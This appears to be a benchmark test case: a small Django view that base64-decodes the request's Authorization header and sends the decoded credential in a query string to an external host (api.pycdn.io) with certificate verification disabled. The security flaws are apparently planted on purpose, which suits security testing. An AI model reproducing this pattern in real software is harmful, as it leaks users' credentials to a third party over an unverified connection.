# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import base64
import requests


def BenchmarkTest07802(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    data = base64.b64decode(auth_header).decode('utf-8', 'ignore')
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
    return JsonResponse({"saved": True})
